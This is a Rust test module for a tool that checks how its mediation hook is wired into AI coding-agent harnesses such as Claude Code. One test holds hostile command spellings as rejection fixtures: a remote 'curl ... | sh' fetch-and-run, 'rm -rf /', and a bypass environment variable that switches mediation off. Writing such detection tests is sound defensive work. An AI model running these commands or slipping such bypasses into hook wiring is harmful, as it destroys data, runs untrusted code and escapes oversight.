        assert_eq!(row.findings[0].event, "PreToolUse");
    }

    #[test]
    fn a_second_command_on_one_event_is_a_second_authority() {
        let mut wiring = complete_wiring();
        let command = hook::wiring_command(hook::Harness::ClaudeCode);
        wiring["hooks"]["Stop"] = serde_json::json!([
            { "hooks": [{ "type": "command", "command": command }] },
            { "hooks": [{ "type": "command", "command": command }] },
        ]);
        let row = claude_row("hooks-twice", &wiring);
        assert!(!row.ok);
        assert_eq!(reasons(&row), vec![EVENT_REGISTERED_N_TIMES]);
    }

    #[test]
    fn a_missing_event_is_refused_rather_than_read_as_a_smaller_green() {
        let mut wiring = complete_wiring();
        wiring["hooks"]
            .as_object_mut()
            .unwrap()
            .remove("UserPromptSubmit")
            .expect("the baseline carries the eighth event");
        let row = claude_row("hooks-missing", &wiring);
        assert!(!row.ok);
        assert_eq!(reasons(&row), vec![EVENT_UNREGISTERED]);
        assert_eq!(row.findings[0].event, "UserPromptSubmit");
    }

    #[test]
    fn a_command_that_reaches_nothing_is_drift_rather_than_silence() {
        // THE FALSE GREEN THIS SELECTOR EXISTS FOR. Selecting batten's entries on
        // "does this reach the engine" would make a renamed command INVISIBLE
        // rather than wrong, and the row would report zero registrations and
        // pass. So the selector asks only whether a command mentions batten.
        let mut wiring = complete_wiring();
        wiring["hooks"]["PreToolUse"][0]["hooks"][0]["command"] =
            serde_json::json!(".claude/hooks/batten-hook-typo.sh");
        let row = claude_row("hooks-drift", &wiring);
        assert!(!row.ok);
        assert_eq!(reasons(&row), vec![COMMAND_DRIFT]);
    }

    #[test]
    fn an_entry_under_an_event_the_derivation_never_emits_can_never_fire() {
        let mut wiring = complete_wiring();
        let command = hook::wiring_command(hook::Harness::ClaudeCode);
        wiring["hooks"]["SomethingThisHostDoesNotEmit"] =
            serde_json::json!([{ "hooks": [{ "type": "command", "command": command }] }]);
        let row = claude_row("hooks-underived", &wiring);
        assert!(!row.ok);
        assert_eq!(reasons(&row), vec![EVENT_UNDERIVED]);
    }

    #[test]
    fn a_sibling_is_counted_and_never_named_and_never_a_failure() {
        // Rule 4 — a sibling is a command line, which carries a path. And whether
        // a hook beside batten's is legitimate is a CONSUMER's judgement:
        // `hooks-wiring-check`'s `DECLARED` table is where this repository
        // refuses them, which is a fact about this repository (non-negotiable
        // rule 1).
        let mut wiring = complete_wiring();
        wiring["hooks"]["Stop"] = serde_json::json!([
            { "hooks": [{ "type": "command", "command": hook::wiring_command(hook::Harness::ClaudeCode) }] },
            { "hooks": [{ "type": "command", "command": "/home/someone/mise-tasks/stop-guard.sh" }] },
        ]);
        let row = claude_row("hooks-sibling", &wiring);
        assert!(
            row.ok,
            "a sibling is reported, not refused: {:?}",
            row.findings
        );
        assert_eq!(row.siblings, 1);
        let rendered = serde_json::to_string(&row).unwrap();
        assert!(
            !rendered.contains("stop-guard") && !rendered.contains("/home/someone"),
            "a sibling is a count, never a name: {rendered}"
        );
    }

    #[test]
    fn an_absent_wiring_file_is_a_finding_never_a_pass() {
        // "Nothing to compare" read as "nothing wrong" is the shape this gate
        // keeps re-meeting. A harness that declares a surface and has no file on
        // it is unwired.
        let dir = scratch("hooks-absent");
        let report = diagnose_hooks(&dir);
        assert!(!report.ok);
        for harness in &report.harnesses {
            assert_eq!(reasons(harness), vec![FILE_MISSING], "{}", harness.harness);
        }
    }

    #[test]
    fn an_unparseable_wiring_file_is_named_distinctly_from_an_absent_one() {
        // Two different remedies — write one, or fix one.
        let dir = write_surface(
            "hooks-unparseable",
            hook::Harness::ClaudeCode,
            "not json at all\n",
        );
        let row = diagnose_hooks(&dir)
            .harnesses
            .into_iter()
            .find(|harness| harness.harness == "claude-code")
            .unwrap();
        assert_eq!(reasons(&row), vec![FILE_UNREADABLE]);
    }

    #[test]
    fn every_harness_the_core_knows_is_diagnosed_or_declares_no_surface() {
        // Ranged over `Harness::ALL`, so a seventh adapter is diagnosed the day
        // it lands rather than silently omitted — the question a hand-kept table
        // answers "no" to. `exit-code` is the one exemption and it is structural:
        // it declares no wiring surface at all.
        let report = diagnose_hooks(&scratch("hooks-census"));
        let diagnosed: Vec<&str> = report.harnesses.iter().map(|row| row.harness).collect();
        for harness in hook::Harness::ALL {
            let expected = harness.wiring().is_some();
            assert_eq!(
                diagnosed.contains(&harness.as_str()),
                expected,
                "{} declares a wiring surface: {expected}",
                harness.as_str()
            );
        }
    }

    #[test]
    fn a_failing_wiring_diagnosis_is_never_a_policy_verdict() {
        // The case that pins §5, and the sub-verb inherits the parent's promise:
        // a harness reads `2` as a deny, and "your wiring is wrong" must never
        // say that.
        let report = diagnose_hooks(&scratch("hooks-never-a-verdict"));
        assert!(!report.ok);
        assert_ne!(report.code(), ExitCode::Violation);
        assert_eq!(report.code(), ExitCode::Usage);
    }

    /// A merged surface is COUNTED only once its shape is valid (CLOUD-525).
    ///
    /// `merged_surfaces_read` exists to keep "looked and found no hooks" apart
    /// from "could not look", and a counter incremented after the JSON parse
    /// rather than after the shape check makes them the same number: a document
    /// that is valid JSON and is not a wiring file reports one surface read and
    /// zero registrations, exactly like a valid file declaring none.
    ///
    /// Driven through `merged_under`, the seam that takes the home directory as
    /// an argument — asserting on `committed_events` alone would leave the
    /// counter itself unexecuted, and the increment could move back above the
    /// shape check without turning anything red.
    ///
    /// Fails by: moving the increment back above the `committed_events` call.
    #[test]
    fn a_document_that_is_not_a_wiring_file_is_could_not_look_rather_than_empty() {
        let file = hook::WiringFile::Key {
            path: "wherever",
            key: "hooks",
        };
        // An array where the map belongs: parses, and is not a wiring file.
        let wrong_shape = serde_json::json!({ "hooks": [] });
        assert!(
            committed_events(&wrong_shape, file).is_none(),
            "a `hooks` that is not an object is unreadable, not empty"
        );
        // And a genuinely empty map IS readable, so the two answers differ.
        let empty = serde_json::json!({ "hooks": {} });
        assert!(
            committed_events(&empty, file).is_some_and(|events| events.is_empty()),
            "an empty hook map is a valid surface declaring nothing"
        );

        // And the counter itself, over a home directory this suite owns.
        let home = scratch("merged-counter-home");
        let project = scratch("merged-counter-project");
        // Derived from the harness table rather than typed here: a host's own
        // file layout is the adapter's fact, and spelling one in this crate is
        // what `no_artifact_name_reaches_the_core` refuses (rule 1).
        let surface = home.join(hook::Harness::ClaudeCode.merge_surfaces()[0]);
        fs::create_dir_all(surface.parent().unwrap()).unwrap();

        let declared = hook::Harness::ClaudeCode.merge_surfaces().len();

        fs::write(&surface, wrong_shape.to_string()).unwrap();
        let tally = merged_under(
            &home,
            &project,
            hook::Harness::ClaudeCode,
            "batten hook",
            false,
        );
        assert_eq!(
            tally.read, 0,
            "a document that is not a wiring file was not read"
        );
        // AND IT LANDED SOMEWHERE. The counter this case was written to hold is
        // `read`, and a zero there used to be the whole answer — which is what
        // let three other dispositions arrive looking the same. Naming the arm
        // is what makes the zero mean one thing.
        assert_eq!(
            tally.unreadable, 1,
            "a wrong-shaped surface is unreadable, not merely unread"
        );
        assert!(
            tally.partitions(declared),
            "every declared surface accounted for exactly once: {tally:?}"
        );

        fs::write(&surface, empty.to_string()).unwrap();
        let tally = merged_under(
            &home,
            &project,
            hook::Harness::ClaudeCode,
            "batten hook",
            false,
        );
        assert_eq!(tally.read, 1, "a valid surface declaring nothing WAS read");
        assert_eq!(tally.commands, 0, "and it declares no registration");
        assert_eq!(tally.siblings, 0);
        assert!(
            tally.partitions(declared),
            "every declared surface accounted for exactly once: {tally:?}"
        );
    }

    /// The five dispositions are a PARTITION, and each one is reachable.
    ///
    /// `merged_surfaces_read` was three-valued in its own doc comment and
    /// one-valued in fact: a zero meant no resolvable home, or a deduplicated
    /// surface, or an unreadable one, or an absent one, and nothing told them
    /// apart. This drives each arm and asserts the sum, so an arm that stops
    /// counting is a failure rather than a quieter zero.
    ///
    /// Fails by: turning any `tally.<disposition> += 1` back into a bare
    /// `continue`.
    #[test]
    fn every_merged_surface_lands_in_exactly_one_disposition() {
        let harness = hook::Harness::ClaudeCode;
        let declared = harness.merge_surfaces().len();
        assert!(declared > 1, "this host declares more than one surface");

        // All absent: the ordinary developer's box.
        let home = scratch("merged-partition-absent");
        let project = scratch("merged-partition-absent-project");
        let tally = merged_under(&home, &project, harness, "batten hook", false);
        assert_eq!(tally.absent, declared);
        assert_eq!(tally.read, 0);
        assert!(tally.partitions(declared), "{tally:?}");

        // Deduplicated: a checkout sitting AT the home directory resolves the
        // user-level surface and the project-level one to one file.
        let shared = scratch("merged-partition-dedup");
        let surface = shared.join(harness.merge_surfaces()[0]);
        fs::create_dir_all(surface.parent().unwrap()).unwrap();
        fs::write(&surface, serde_json::json!({ "hooks": {} }).to_string()).unwrap();
        let tally = merged_under(&shared, &shared, harness, "batten hook", false);
        assert_eq!(
            tally.deduplicated, 1,
            "the same file is not a second surface"
        );
        assert!(tally.partitions(declared), "{tally:?}");

        // Unreadable: present, and not JSON at all.
        let home = scratch("merged-partition-unreadable");
        let project = scratch("merged-partition-unreadable-project");
        let surface = home.join(harness.merge_surfaces()[0]);
        fs::create_dir_all(surface.parent().unwrap()).unwrap();
        fs::write(&surface, "{ not json").unwrap();
        let tally = merged_under(&home, &project, harness, "batten hook", false);
        assert_eq!(tally.unreadable, 1);
        assert!(tally.partitions(declared), "{tally:?}");
    }

    /// A merged sibling is counted apart from batten's own merged registration.
    ///
    /// `merged` fuses the two, so `siblings == 0 && merged == 0` is unsatisfiable
    /// on any machine where batten is itself on a user-level surface — which is
    /// the ordinary case. A consumer's gate cannot ask "is there a hook here that
    /// is not mine" without this split.
    ///
    /// Fails by: incrementing `commands` alone and leaving `siblings` at zero.
    #[test]
    fn a_merged_sibling_is_counted_apart_from_battens_own() {
        let harness = hook::Harness::ClaudeCode;
        let home = scratch("merged-sibling-home");
        let project = scratch("merged-sibling-project");
        let surface = home.join(harness.merge_surfaces()[0]);
        fs::create_dir_all(surface.parent().unwrap()).unwrap();
        let command = hook::wiring_command(harness);
        fs::write(
            &surface,
            serde_json::json!({
                "hooks": {
                    "Stop": [
                        { "hooks": [{ "type": "command", "command": command }] },
                        { "hooks": [{ "type": "command",
                                      "command": "/home/someone/.claude/stop-hook-git-check.sh" }] },
                    ]
                }
            })
            .to_string(),
        )
        .unwrap();

        let tally = merged_under(&home, &project, harness, &command, false);
        assert_eq!(tally.commands, 2, "both commands are on the surface");
        assert_eq!(tally.siblings, 1, "exactly one of them is not batten's");
        assert_eq!(
            tally.findings.len(),
            1,
            "and batten's own merged entry is the finding"
        );
        assert_eq!(tally.findings[0].reason, MERGED_REGISTRATION);
        // Rule 4 holds over the new counter as well: a number, never a name.
        let rendered = format!("{tally:?}");
        assert!(
            !rendered.contains("stop-hook-git-check") && !rendered.contains("/home/someone"),
            "a merged sibling is a count, never a name: {rendered}"
        );
    }

    /// A sibling is a finding UNDER THE DECLARATION and a count without it.
    ///
    /// Both directions, because the whole claim about `[hook] exclusive` is that
    /// it is raise-only: the off-state must stay exactly what it was, or an
    /// adopter inherits a verdict by upgrading, and the on-state must actually
    /// refuse, or the declaration is prose. A test asserting only one of the two
    /// cannot tell a working flag from a flag wired to nothing.
    ///
    /// Fails by: dropping either `if exclusive` guard, or hard-coding it true.
    #[test]
    fn a_sibling_refuses_only_where_the_consumer_declared_the_surface_exclusive() {
        let harness = hook::Harness::ClaudeCode;
        let mut wiring = complete_wiring();
        wiring["hooks"]["Stop"] = serde_json::json!([
            { "hooks": [{ "type": "command", "command": hook::wiring_command(harness) }] },
            { "hooks": [{ "type": "command", "command": "/home/someone/mise-tasks/stop-guard.sh" }] },
        ]);
        let dir = write_surface(
            "hooks-exclusive",
            harness,
            &serde_json::to_string_pretty(&wiring).unwrap(),
        );

        let permissive =
            diagnose_harness(&dir, harness, false).expect("claude-code declares a wiring surface");
        assert!(
            permissive.ok,
            "undeclared: a sibling stays a count, not a failure — {:?}",
            permissive.findings
        );
        assert_eq!(permissive.siblings, 1);

        let declared =
            diagnose_harness(&dir, harness, true).expect("claude-code declares a wiring surface");
        assert!(!declared.ok, "declared: a sibling is a finding");
        // CONTAINMENT, NOT EQUALITY, and the reason is worth stating rather than
        // working around: `diagnose_harness` reads the MACHINE's `$HOME` for the
        // merged surfaces, so on a box whose launcher provisions hooks this list
        // also carries `MERGED_SIBLING` — which is the engine working, not noise.
        // Asserting equality here would make the case pass or fail on whose
        // container it ran in. The merged half has its own case, driven through
        // `merged_under`'s injected home, which is the seam that IS deterministic.
        let committed: Vec<&str> = declared
            .findings
            .iter()
            .filter(|finding| finding.reason == SIBLING_REGISTERED)
            .map(|finding| finding.event.as_str())
            .collect();
        assert_eq!(
            committed,
            vec!["Stop"],
            "exactly one committed sibling, on the event it was written to: {:?}",
            declared.findings
        );
        // The count does not move with the verdict: the number is the engine's
        // and the refusal is the consumer's, and they are separately readable.
        assert_eq!(declared.siblings, permissive.siblings);
        // Rule 4 survives the new finding — still no command, still no path.
        let rendered = serde_json::to_string(&declared).unwrap();
        assert!(
            !rendered.contains("stop-guard") && !rendered.contains("/home/someone"),
            "the finding names the event, never the command: {rendered}"
        );
    }

    /// The same, on a merged surface, through the seam the suite can drive.
    ///
    /// Its own case because the remedy differs — a merged registration is under
    /// `$HOME` and editing the repository cannot remove it — so it carries its
    /// own reason id and that id has to be reachable.
    ///
    /// Fails by: dropping the `if exclusive` guard in `merged_under`.
    #[test]
    fn a_merged_sibling_refuses_only_under_the_declaration_too() {
        let harness = hook::Harness::ClaudeCode;
        let home = scratch("merged-exclusive-home");
        let project = scratch("merged-exclusive-project");
        let surface = home.join(harness.merge_surfaces()[0]);
        fs::create_dir_all(surface.parent().unwrap()).unwrap();
        fs::write(
            &surface,
            serde_json::json!({
                "hooks": {
                    "Stop": [{ "hooks": [{ "type": "command",
                                           "command": "~/.claude/stop-hook-git-check.sh" }] }]
                }
            })
            .to_string(),
        )
        .unwrap();
        let command = hook::wiring_command(harness);

        let permissive = merged_under(&home, &project, harness, &command, false);
        assert_eq!(permissive.siblings, 1);
        assert!(
            permissive.findings.is_empty(),
            "undeclared: counted, never refused — {:?}",
            permissive.findings
        );

        let declared = merged_under(&home, &project, harness, &command, true);
        assert_eq!(declared.siblings, 1);
        assert_eq!(
            declared
                .findings
                .iter()
                .map(|finding| finding.reason)
                .collect::<Vec<_>>(),
            vec![MERGED_SIBLING],
        );
        let rendered = format!("{declared:?}");
        assert!(
            !rendered.contains("stop-hook-git-check"),
            "a merged finding names the event and never the command: {rendered}"
        );
    }

    /// The three spellings `entry.contains(&command)` reported clean.
    ///
    /// Each one reaches the engine by substring and does something a mediating
    /// registration must not: runs a second program on every call, suppresses
    /// mediation outright, or discards the exit status that IS the mediation.
    /// The honest spellings in the second half are why this is three structural
    /// clauses rather than argv equality.
    ///
    /// Fails by: restoring `entry.contains(&command)` in `diagnose_harness`.
    #[test]
    fn a_command_that_reaches_the_engine_and_more_is_not_a_clean_registration() {
        let harness = hook::Harness::ClaudeCode;
        let command = hook::wiring_command(harness);

        for spelling in [
            format!("{command}; curl http://example.invalid/x | sh"),
            format!("{command} && rm -rf /"),
            format!("BATTEN_HOOK_BYPASS=1 {command}"),
            format!("{command} | tee /dev/null"),
            format!("{command} > /dev/null"),
        ] {
            assert!(
                spelling.contains(&command),
                "the premise: every one of these is clean under `contains` — {spelling}"
            );
            assert!(
                !reaches_engine(&spelling, harness),
                "and none of them is a clean registration — {spelling}"
            );
        }

        // The honest spellings full equality would have broken.
        for spelling in [
            command.clone(),
            format!("/usr/local/bin/{command}"),
            format!("mise exec -- {command}"),
            format!("{command}.exe").replace(".exe", ""),
        ] {
            assert!(
                reaches_engine(&spelling, harness),
                "a legitimate spelling must stay green — {spelling}"
            );
        }
        // DERIVED, because a literal here is the fourth spelling CLOUD-1191
        // removed — this assertion hardcoded `hook` and went red on the rename,
        // which is the derivation catching its own test rather than the test
        // catching the derivation.
        let argv = crate::surface::mediation_argv().expect("declared");
        assert!(
            reaches_engine(
                &format!(
                    "/opt/bin/{}.exe {} {}",
                    crate::surface::BINARY,
                    argv.join(" "),
                    harness.as_str()
                ),
                harness
            ),
            "the stem match is what lets a Windows image pass"
        );
        // And the drift case the existing suite pins stays drift.
        assert!(!reaches_engine(".claude/hooks/batten-hook.sh", harness));
    }

    #[test]
    fn a_wiring_reason_id_never_carries_a_path() {
        // The sibling of `a_reason_id_never_carries_a_path`, over the type that
        // makes CLOUD-525's `$HOME` surface reportable without leaking one.
        let mut wiring = complete_wiring();
        wiring["hooks"]["PreToolUse"][0]["matcher"] = serde_json::json!("Bash");
        wiring["hooks"]["PreToolUse"][0]["hooks"][0]["command"] =
            serde_json::json!("/home/someone/.claude/hooks/batten-hook.sh");
        let mut rows = vec![claude_row("hooks-no-paths", &wiring)];
        rows.extend(diagnose_hooks(&scratch("hooks-no-paths-absent")).harnesses);
        for row in rows {
            for finding in &row.findings {
                assert!(
                    !finding.reason.contains('/'),
                    "{} looks like a path",
                    finding.reason
                );
                assert!(
                    !finding.event.contains('/'),
                    "{} looks like a path",
                    finding.event
                );
            }
        }
    }

    #[test]
    fn the_bare_diagnosis_is_unchanged_by_the_sub_verb() {
        // House style §8 promises what bare `batten doctor` does, so adding a
        // sub-verb must not move it. Asserted on the named checks rather than a
        // count, matching `every_check_is_reported_not_just_the_first_failure`.
        //
        // `HOOK_HANDLERS` IS A CHECK, NOT A SUB-VERB, and the distinction is
        // what this case is actually about. §8's clause is that `doctor`
        // validates the RESOLVED CONFIG; a `[[hook.handler]]` row is resolved
        // config, and asking whether its program resolves is the same question
        // `COMMAND_PROGRAMS` already asks of a `command` rule — same family,
        // same verb, one more row. What the case forbids is `doctor hooks`
        // leaking into this list, which it still does not.
        //
        // `PIN_RECORD` joins on the same footing (CLOUD-1324): the pin's memo is
        // resolved config too, and whether it can still answer decides whether
        // `COMMAND_PROGRAMS` above is reading the pin or guessing. Its own row
        // rather than a mode of that one, because the repairs differ.
        let names: Vec<&str> = diagnose(&scratch("bare-unchanged"))
            .checks
            .iter()
            .map(|check| check.name)
            .collect();
        assert_eq!(
            names,
            vec![
                CONFIG,
                GIT_REPO,
                COMMAND_PROGRAMS,
                PIN_RECORD,
                HOOK_HANDLERS,
                PLAN_SURFACE
            ]
        );
    }

    #[test]
    fn a_check_line_is_pointer_shaped() {
        assert_eq!(Check::passed("config").line(), "config ok");
        assert_eq!(
            Check::failed("config", "config-missing").line(),
            "config failed config-missing"
        );
    }
}
